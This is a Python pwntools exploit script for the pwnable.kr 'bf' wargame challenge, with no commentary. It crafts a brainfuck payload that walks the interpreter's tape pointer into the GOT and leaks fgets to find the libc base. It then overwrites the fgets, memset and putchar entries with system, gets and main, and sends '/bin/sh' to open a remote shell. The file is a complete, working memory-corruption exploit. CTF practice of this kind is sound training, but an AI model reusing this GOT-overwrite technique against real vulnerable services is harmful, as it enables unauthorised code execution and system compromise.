from pwn import *

def move(cur, new):
    x = cur - new
    if x > 0:
        return '<' * x
    return '>' * -x

def read(n):
    return ".>" * n + '<' * n

def write(n):
    return ",>" * n + '<' * n

main = 0x08048671
tape = 0x0804a0a0

plt = {"fgets": 0x0804a010, "memset": 0x0804a02c, "putchar": 0x0804a030}

libc = ELF("./bf_libc.so")
offset = {"fgets": libc.symbols[b"fgets"], "gets": libc.symbols[b"gets"], "system": libc.symbols[b"system"]}

pl = move(tape, plt["fgets"])
pl += read(4)
pl += write(4)
pl += move(plt["fgets"], plt["memset"])
pl += write(4)
pl += move(plt["memset"], plt["putchar"])
pl += write(4)
pl += '.'

r = remote("pwnable.kr", 9001)
r.recvline()
r.recvline()
r.sendline(pl)

fgets = int.from_bytes(r.recvn(4), byteorder = "little", signed = False)
print("fgets: " + hex(fgets))
libc_base = fgets - offset["fgets"]
gets = libc_base + offset["gets"]
print("gets: " + hex(gets))
system = libc_base + offset["system"]
print("system: " + hex(system))

r.send(p32(system))
r.send(p32(gets))
r.send(p32(main))
r.sendline(b"/bin/sh\x00")
r.interactive()

